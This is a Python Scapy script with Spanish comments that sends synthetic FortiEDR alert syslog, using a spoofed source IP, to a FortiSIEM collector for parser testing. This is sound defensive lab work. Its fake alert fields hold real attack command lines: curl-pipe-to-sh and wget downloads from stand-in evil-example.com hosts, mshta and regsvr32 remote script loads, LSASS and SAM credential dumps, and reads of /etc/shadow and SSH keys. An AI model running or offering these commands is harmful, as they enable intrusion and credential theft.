#!/usr/bin/env python3
"""
FortiEDR parser-aligned Scapy simulator for FortiSIEM

Genera logs exactamente orientados al parser FortiEDR aportado:

Recognizer esperado por el parser:
  <PRI>1 2026-05-03T12:00:00.000+02:00 <host/ip opcional> FortiEDR <tok1> <tok2> <tok3><body>

Regex del parser:
  <PRI>\d+ YYYY-MM-DDTHH:MM:SS.mmmTZ [host] FortiEDR (3 tokens) _body

El cuerpo debe ir en key-value:
  Action: Block;Classification: Malicious;Description: ...;Device Name: ...;Source IP: ...;

El parser mapea:
  Action -> fwAction, normaliza Block -> Blocked, Log -> Logging
  Classification -> classifier
  Device Name -> hostName
  Source IP -> hostIpAddr
  Process Name -> procName
  Process Path -> procPath
  Command line -> command
  Destination -> destIpAddr/destName/targetOsObjName
  Remote Connection -> srcIpAddr
  Threat Name/Family/Type -> virusName/virusFamily/virusType
  Users/User Name -> user
  Operating System -> osType

EventTypes esperados:
  FortiEDR-Security-Malicious-Blocked
  FortiEDR-Security-Suspicious-Blocked
  FortiEDR-Security-Suspicious-Logging
  FortiEDR-Security-Pup-Blocked
  FortiEDR-System-Login-Success
  FortiEDR-System-Login-Failure
  FortiEDR-System-Logout

Uso:
  sudo apt update
  sudo apt install -y python3-scapy

  sudo python3 fortiedr_parser_aligned_scapy.py \
    --fortisiem-ip 10.0.0.50 \
    --reporting-ip 172.16.20.110 \
    --once \
    --count 20

Imprimir eventos para Test Parser:
  sudo python3 fortiedr_parser_aligned_scapy.py --fortisiem-ip 10.0.0.50 --print-test-events

No ejecuta malware ni acciones reales. Solo envía syslog UDP sintético.
"""

from scapy.all import IP, UDP, Raw, send
from datetime import datetime, timezone, timedelta
import argparse
import random
import signal
import time


RUNNING = True


USERS = [
    "corp\\j.garcia",
    "corp\\m.rodriguez",
    "corp\\a.sanchez",
    "corp\\l.martin",
    "corp\\svc_backup",
    "nt authority\\system",
    "root",
    "www-data",
    "postgres",
    "monitoring",
]

ENDPOINTS = [
    {"hostname": "MAD-W11-FIN-014", "ip": "10.0.10.30", "os": "Windows 11 Pro 23H2", "os_family": "windows", "group": "Finance Workstations"},
    {"hostname": "MAD-W11-HR-022", "ip": "10.0.10.31", "os": "Windows 11 Enterprise 23H2", "os_family": "windows", "group": "HR Workstations"},
    {"hostname": "MAD-W11-IT-041", "ip": "10.0.10.41", "os": "Windows 11 Pro 23H2", "os_family": "windows", "group": "IT Workstations"},
    {"hostname": "BCN-W11-LEGAL-011", "ip": "10.1.10.11", "os": "Windows 11 Enterprise 23H2", "os_family": "windows", "group": "Legal Workstations"},
    {"hostname": "MAD-SRV-APP-003", "ip": "10.0.20.45", "os": "Windows Server 2019 Standard", "os_family": "windows", "group": "Application Servers"},
    {"hostname": "MAD-SRV-FS-001", "ip": "10.0.20.50", "os": "Windows Server 2022 Standard", "os_family": "windows", "group": "File Servers"},
    {"hostname": "MAD-SRV-SQL-002", "ip": "10.0.20.60", "os": "Windows Server 2019 Datacenter", "os_family": "windows", "group": "Database Servers"},
    {"hostname": "MAD-LNX-WEB-001", "ip": "10.0.30.21", "os": "Ubuntu Server 22.04 LTS", "os_family": "linux", "group": "Linux Web Servers"},
    {"hostname": "MAD-LNX-DB-002", "ip": "10.0.30.22", "os": "Red Hat Enterprise Linux 9", "os_family": "linux", "group": "Linux Database Servers"},
    {"hostname": "MAD-LNX-JMP-001", "ip": "10.0.30.10", "os": "Ubuntu Server 22.04 LTS", "os_family": "linux", "group": "Jump Servers"},
    {"hostname": "BCN-LNX-DOCKER-001", "ip": "10.1.30.40", "os": "Debian GNU/Linux 12", "os_family": "linux", "group": "Container Hosts"},
    {"hostname": "VLC-LNX-MON-001", "ip": "10.2.30.15", "os": "Rocky Linux 9", "os_family": "linux", "group": "Monitoring Servers"},
]

C2_IPS = ["45.83.120.10", "91.199.212.44", "185.203.118.77", "193.56.29.101"]
C2_DOMAINS = [
    "update-checkin-cdn.evil-example.com",
    "api-sync-service.evil-example.com",
    "cdn-telemetry-cache.evil-example.com",
    "edge-service-updater.evil-example.com",
]

WINDOWS_PATHS = [
    r"C:\Users\Public\Documents\AdobeSync\AdobeUpdate.exe",
    r"C:\Users\Public\sysupdate.exe",
    r"C:\Windows\Temp\7zS4A1.tmp\setup.exe",
    r"C:\ProgramData\Microsoft\Windows\Caches\msedge_update.exe",
    r"C:\Windows\Tasks\OfficeTelemetryAgent.exe",
]

LINUX_PATHS = [
    "/tmp/.sysupdate",
    "/tmp/.cache/.x11",
    "/var/tmp/kworker",
    "/dev/shm/.dbus-update",
    "/usr/local/bin/systemd-helper",
]

WINDOWS_PROCESSES = [
    ("powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
    ("cmd.exe", r"C:\Windows\System32\cmd.exe"),
    ("mshta.exe", r"C:\Windows\System32\mshta.exe"),
    ("rundll32.exe", r"C:\Windows\System32\rundll32.exe"),
    ("regsvr32.exe", r"C:\Windows\System32\regsvr32.exe"),
    ("certutil.exe", r"C:\Windows\System32\certutil.exe"),
    ("bitsadmin.exe", r"C:\Windows\System32\bitsadmin.exe"),
]

LINUX_PROCESSES = [
    ("bash", "/bin/bash"),
    ("sh", "/bin/sh"),
    ("curl", "/usr/bin/curl"),
    ("wget", "/usr/bin/wget"),
    ("python3", "/usr/bin/python3"),
    ("systemctl", "/bin/systemctl"),
    ("crontab", "/usr/bin/crontab"),
]

MALWARE_NAMES = [
    "W32/Agent.AFD!tr",
    "W64/GenKryptik.AJ!tr",
    "MSIL/Kryptik.ACY!tr",
    "Riskware/PowerShell.Downloader",
    "Suspicious/EncodedPowerShell",
    "Trojan/Win32.RedLineStealer",
    "Backdoor/Win32.AsyncRAT",
    "Linux/Backdoor.Gafgyt",
    "Linux/CoinMiner.A",
    "Malware/Generic.AI.Detected",
]

THREAT_FAMILIES = ["Agent", "Kryptik", "RedLine", "AsyncRAT", "CoinMiner", "Gafgyt", "Generic"]
THREAT_TYPES = ["Trojan", "Backdoor", "Riskware", "Downloader", "Ransomware", "CoinMiner"]


def stop_handler(signum, frame):
    global RUNNING
    RUNNING = False
    print("\n[!] Deteniendo FortiEDR parser-aligned simulator...")


signal.signal(signal.SIGINT, stop_handler)
signal.signal(signal.SIGTERM, stop_handler)


def rfc5424_ts(offset_hours=2):
    tz = timezone(timedelta(hours=offset_hours))
    now = datetime.now(tz)
    return now.strftime("%Y-%m-%dT%H:%M:%S.") + f"{int(now.microsecond/1000):03d}" + now.strftime("%z")[:3] + ":" + now.strftime("%z")[3:]


def random_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))


def random_hash():
    return f"{random.getrandbits(256):064x}"


def pick_endpoint(os_filter="any"):
    candidates = ENDPOINTS
    if os_filter != "any":
        candidates = [e for e in ENDPOINTS if e["os_family"] == os_filter]
    ep = random.choice(candidates).copy()
    if ep["os_family"] == "windows":
        ep["user"] = random.choice([u for u in USERS if "\\" in u])
    else:
        ep["user"] = random.choice(["root", "www-data", "postgres", "monitoring", "backup"])
    ep["mac"] = random_mac()
    return ep


def pick_process(ep):
    if ep["os_family"] == "windows":
        return random.choice(WINDOWS_PROCESSES)
    return random.choice(LINUX_PROCESSES)


def pick_path(ep):
    return random.choice(WINDOWS_PATHS if ep["os_family"] == "windows" else LINUX_PATHS)


def q(value):
    """
    El parser usa kvsep ': ' y sep ';'. No metas ';' dentro de valores.
    """
    value = str(value).replace(";", ",")
    return value


def body_kv(**kwargs):
    """
    Devuelve:
      Key: value;Key2: value2;...
    Ojo: el parser espera kvsep ': ' y sep ';'.
    """
    return "".join(f"{key}: {q(value)};" for key, value in kwargs.items() if value is not None)


def syslog_message(args, body):
    """
    Estructura exacta orientada al recognizer:
      <134>1 2026-05-03T12:00:00.000+02:00 172.16.20.110 FortiEDR token1 token2 token3 <body>

    Tras 'FortiEDR' hay 3 tokens sin espacios:
      - Security
      - Alert
      - 1
    El parser los descarta con (?:\s+\S+){3} y empieza a parsear _body después.
    """
    return f"{args.pri}1 {rfc5424_ts(args.tz_offset)} {args.reporting_name} FortiEDR Security Alert 1 {body}"


def send_syslog(args, body):
    raw = syslog_message(args, body)
    pkt = (
        IP(src=args.reporting_ip, dst=args.fortisiem_ip)
        / UDP(sport=random.randint(20000, 65000), dport=args.port)
        / Raw(load=raw.encode("utf-8", errors="ignore"))
    )
    send(pkt, verbose=False)


def base_fields(args, ep, description, action, classification, destination=None, remote_connection=None, command=None, process_name=None, process_path=None, script_path=None):
    proc_name, proc_path = pick_process(ep)
    if process_name:
        proc_name = process_name
    if process_path:
        proc_path = process_path

    return {
        "Action": action,
        "Classification": classification,
        "Count": random.randint(1, 5),
        "Country": "Spain",
        "Description": description,
        "Destination": destination,
        "Script": script_path or pick_path(ep),
        "Device Name": ep["hostname"],
        "Event ID": f"FEDR-{random.randint(10000000, 99999999)}",
        "MAC Address": ep["mac"],
        "Operating System": ep["os"],
        "Organization ID": args.tenant_id,
        "Organization": args.tenant_name,
        "Process Name": proc_name,
        "Process Path": proc_path,
        "Raw Data ID": f"RAW-{random.randint(10000000, 99999999)}",
        "Rules List": random.choice([
            "Execution Prevention",
            "Ransomware Prevention",
            "Communication Control",
            "Suspicious Script Control",
            "File Reputation",
            "Behavioral Analysis",
        ]),
        "Sub-system": random.choice(["Prevention", "Post-Execution", "Communication Control", "Collector"]),
        "Users": ep["user"],
        "User Name": ep["user"],
        "Device State": random.choice(["Running", "Protected", "Online"]),
        "First Seen": datetime.now().strftime("%d-%b-%Y, %H:%M:%S"),
        "Last Seen": datetime.now().strftime("%d-%b-%Y, %H:%M:%S"),
        "Process Hash": random_hash(),
        "Source IP": ep["ip"],
        "Script Path": script_path or pick_path(ep),
        "Threat Name": random.choice(MALWARE_NAMES),
        "Threat Family": random.choice(THREAT_FAMILIES),
        "Threat Type": random.choice(THREAT_TYPES),
        "Remote Connection": remote_connection,
        "Autonomous System": random.choice(["N/A", "AS15169", "AS13335", "AS9009", "AS12389"]),
        "Command line": command,
    }


# =========================
# EVENTOS ALINEADOS AL PARSER
# =========================

def ev_malicious_blocked(args, ep):
    proc_name, proc_path = pick_process(ep)
    path = pick_path(ep)
    fields = base_fields(
        args, ep,
        description="Malicious file was detected and blocked",
        action="Block",  # parser lo normaliza a Blocked
        classification="Malicious",
        destination=random.choice(C2_IPS),
        remote_connection=random.choice(C2_IPS),
        command=f"{proc_name} --load {path}",
        process_name=proc_name,
        process_path=proc_path,
        script_path=path,
    )
    return body_kv(**fields)


def ev_suspicious_blocked(args, ep):
    if ep["os_family"] == "windows":
        cmd = random.choice([
            r"powershell.exe -NoProfile -EncodedCommand <redacted>",
            r"cmd.exe /c whoami && hostname && ipconfig /all",
            r"mshta.exe http://edge-service-updater.evil-example.com/update.hta",
            r"regsvr32.exe /s /n /u /i:http://api-sync-service.evil-example.com/scrobj.sct scrobj.dll",
        ])
    else:
        cmd = random.choice([
            "bash -c curl http://update-checkin-cdn.evil-example.com/payload.sh | sh",
            "wget -q http://api-sync-service.evil-example.com/init -O /tmp/.cache/.x11",
            "chmod +x /tmp/.sysupdate && /tmp/.sysupdate --silent",
        ])
    proc_name, proc_path = pick_process(ep)
    fields = base_fields(
        args, ep,
        description="Suspicious process execution was detected",
        action="Block",
        classification="Suspicious",
        destination=random.choice(C2_DOMAINS),
        remote_connection=random.choice(C2_IPS),
        command=cmd,
        process_name=proc_name,
        process_path=proc_path,
    )
    return body_kv(**fields)


def ev_c2_logging(args, ep):
    dst_ip = random.choice(C2_IPS)
    dst_domain = random.choice(C2_DOMAINS)
    proc_name, proc_path = pick_process(ep)
    fields = base_fields(
        args, ep,
        description="Outbound connection to suspicious destination was detected",
        action="Log",  # parser lo normaliza a Logging
        classification="Suspicious",
        destination=dst_ip,
        remote_connection=dst_ip,
        command=f"{proc_name} --connect https://{dst_domain}/checkin",
        process_name=proc_name,
        process_path=proc_path,
    )
    fields["Destination"] = dst_ip
    return body_kv(**fields)


def ev_ransomware(args, ep):
    proc_name, proc_path = pick_process(ep)
    fields = base_fields(
        args, ep,
        description="Ransomware-like file modification behavior detected",
        action="Block",
        classification="Malicious",
        destination=ep["hostname"],
        remote_connection=None,
        command=f"{proc_name} mass file modification detected",
        process_name=proc_name,
        process_path=proc_path,
        script_path=(r"C:\Shares\Finance\finance_backup.xlsx.encrypted" if ep["os_family"] == "windows" else "/srv/finance/finance_backup.xlsx.encrypted"),
    )
    fields["Threat Name"] = "Ransomware/Behavioral.Detection"
    fields["Threat Family"] = "Ransomware"
    fields["Threat Type"] = "Ransomware"
    fields["Rules List"] = "Ransomware Prevention"
    fields["Sub-system"] = "Prevention"
    return body_kv(**fields)


def ev_credential_access(args, ep):
    if ep["os_family"] == "windows":
        cmd = random.choice([
            r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Windows\Temp\lsass.dmp full",
            r"procdump.exe -ma lsass.exe C:\Windows\Temp\lsass.dmp",
            r"reg.exe save HKLM\SAM C:\Windows\Temp\sam.save",
        ])
    else:
        cmd = random.choice([
            "cat /etc/shadow",
            "tar -czf /tmp/ssh_keys.tgz /home/*/.ssh",
            "grep -R password /etc /home 2>/dev/null",
        ])
    proc_name, proc_path = pick_process(ep)
    fields = base_fields(
        args, ep,
        description="Credential access behavior detected",
        action="Block",
        classification="Malicious",
        destination=ep["hostname"],
        remote_connection=None,
        command=cmd,
        process_name=proc_name,
        process_path=proc_path,
    )
    fields["Rules List"] = "Behavioral Analysis"
    fields["Threat Type"] = "Credential Theft"
    fields["Threat Family"] = "Credential Access"
    return body_kv(**fields)


def ev_pup_blocked(args, ep):
    proc_name, proc_path = pick_process(ep)
    fields = base_fields(
        args, ep,
        description="Potentially unwanted application was blocked",
        action="Block",
        classification="Pup",
        destination=None,
        remote_connection=None,
        command=f"{proc_name} installer execution",
        process_name=proc_name,
        process_path=proc_path,
    )
    fields["Threat Name"] = "PUP/Toolbar.Generic"
    fields["Threat Family"] = "PUP"
    fields["Threat Type"] = "Potentially Unwanted Application"
    return body_kv(**fields)


def ev_system_login(args, ep, success=True):
    # msg/Description exacto dispara eventType FortiEDR-System-Login-Success/Failure
    fields = base_fields(
        args, ep,
        description="System login" if success else "System login failed",
        action="Log",
        classification="Likely Safe",
        destination=None,
        remote_connection=None,
        command=None,
    )
    fields["Users"] = random.choice(["admin", "soc.operator", "readonly.user"])
    fields["User Name"] = fields["Users"]
    fields["Sub-system"] = "System"
    return body_kv(**fields)


GENERATORS = [
    ev_malicious_blocked,
    ev_suspicious_blocked,
    ev_c2_logging,
    ev_ransomware,
    ev_credential_access,
    ev_pup_blocked,
]


def send_round(args):
    print(f"\n[+] Enviando {args.count} eventos FortiEDR alineados al parser")
    for i in range(args.count):
        ep = pick_endpoint(args.os_filter)
        gen = random.choice(GENERATORS)
        body = gen(args, ep)
        send_syslog(args, body)
        print(f"    OK {i+1:03d}/{args.count} endpoint={ep['hostname']:18} ip={ep['ip']:15}")
        time.sleep(random.uniform(args.min_delay, args.max_delay))

    if args.include_system:
        ep = pick_endpoint(args.os_filter)
        send_syslog(args, ev_system_login(args, ep, success=True))
        send_syslog(args, ev_system_login(args, ep, success=False))
        print("    OK system login success/failure")


def print_test_events(args):
    ep = pick_endpoint(args.os_filter)
    for name, gen in [
        ("Malicious Blocked", ev_malicious_blocked),
        ("Suspicious Logging/C2", ev_c2_logging),
        ("System Login Success", lambda a, e: ev_system_login(a, e, True)),
    ]:
        body = gen(args, ep)
        print(f"\n### {name}")
        print(syslog_message(args, body))


def parse_args():
    p = argparse.ArgumentParser(description="FortiEDR parser-aligned Scapy simulator for FortiSIEM")
    p.add_argument("--fortisiem-ip", required=True, help="IP del FortiSIEM Collector/Supervisor")
    p.add_argument("--port", type=int, default=514)
    p.add_argument("--reporting-ip", default="172.16.20.110", help="IP origen spoofeada")
    p.add_argument("--reporting-name", default="172.16.20.110", help="Host/IP que va en el campo syslog RFC5424 antes de FortiEDR")
    p.add_argument("--tenant-id", default="LAB-TENANT-ID")
    p.add_argument("--tenant-name", default="LAB-TENANT")
    p.add_argument("--count", type=int, default=15)
    p.add_argument("--os-filter", choices=["any", "windows", "linux"], default="any")
    p.add_argument("--loop", action="store_true")
    p.add_argument("--once", action="store_true")
    p.add_argument("--interval", type=int, default=60)
    p.add_argument("--include-system", action="store_true", help="Añade System login success/failure")
    p.add_argument("--print-test-events", action="store_true")
    p.add_argument("--pri", default="<134>")
    p.add_argument("--tz-offset", type=int, default=2)
    p.add_argument("--min-delay", type=float, default=0.2)
    p.add_argument("--max-delay", type=float, default=0.8)
    return p.parse_args()


def main():
    args = parse_args()

    print("[+] FortiEDR parser-aligned Scapy simulator")
    print(f"[+] FortiSIEM: {args.fortisiem_ip}:{args.port}/UDP")
    print(f"[+] Reporting IP spoofeada: {args.reporting_ip}")
    print(f"[+] RFC5424 host field: {args.reporting_name}")
    print("[+] EventTypes esperados: FortiEDR-Security-Malicious-Blocked, FortiEDR-Security-Suspicious-Blocked, FortiEDR-Security-Suspicious-Logging")

    if args.print_test_events:
        print_test_events(args)
        return

    if not args.loop:
        send_round(args)
        print("[+] Finalizado.")
        return

    while RUNNING:
        send_round(args)
        print(f"[+] Próxima ronda en {args.interval} segundos")
        for _ in range(args.interval):
            if not RUNNING:
                break
            time.sleep(1)

    print("[+] Simulador detenido.")


if __name__ == "__main__":
    main()

